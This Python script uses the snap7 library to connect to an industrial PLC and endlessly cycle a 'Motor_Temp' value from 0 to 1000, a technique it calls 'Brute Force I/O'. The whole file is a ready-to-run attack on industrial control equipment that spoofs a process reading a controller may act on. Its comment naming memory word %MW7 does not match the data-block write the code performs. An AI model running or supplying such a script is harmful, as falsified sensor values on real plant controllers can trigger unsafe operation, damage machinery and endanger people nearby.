import snap7
import time
from snap7.util import *
from snap7.types import *

# Step 1: Discover PLC IP (if unknown)
def discover_plc_ip():
    # Use a network scanner or ARP to discover the PLC's IP address
    # This is a placeholder for the actual implementation
    plc_ip = "192.168.0.1"  # Replace with actual IP discovery logic
    print(f"Discovered PLC IP: {plc_ip}")
    return plc_ip

# Step 2: Connect to the PLC
def connect_to_plc(ip):
    plc = snap7.client.Client()
    plc.connect(ip, 0, 1)  # IP, Rack, Slot
    if plc.get_connected():
        print(f"Connected to PLC at {ip}")
    else:
        print(f"Failed to connect to PLC at {ip}")
        exit(1)
    return plc

# Step 3: Brute Force I/O on Motor_Temp
def brute_force_motor_temp(plc):
    motor_temp_address = 7  # %MW7 (Motor_Temp) address
    min_temp = 0
    max_temp = 1000
    step = 100
    delay = 0.5  # Delay between changes in seconds

    print("Starting Brute Force I/O on Motor_Temp...")
    try:
        while True:
            for temp in range(min_temp, max_temp + 1, step):
                # Write the temperature value to %MW7
                plc.db_write(1, motor_temp_address, int_to_bytes(temp))
                print(f"Set Motor_Temp to {temp}")
                time.sleep(delay)
    except KeyboardInterrupt:
        print("Brute Force I/O stopped.")

# Helper function: Convert integer to bytes
def int_to_bytes(value):
    return bytearray([(value >> 8) & 0xFF, value & 0xFF])

# Main execution
if __name__ == "__main__":
    # Step 1: Discover PLC IP (if unknown)
    plc_ip = discover_plc_ip()

    # Step 2: Connect to the PLC
    plc = connect_to_plc(plc_ip)

    # Step 3: Perform Brute Force I/O on Motor_Temp
    brute_force_motor_temp(plc)

    # Disconnect from the PLC
    plc.disconnect()
    print("Disconnected from PLC.")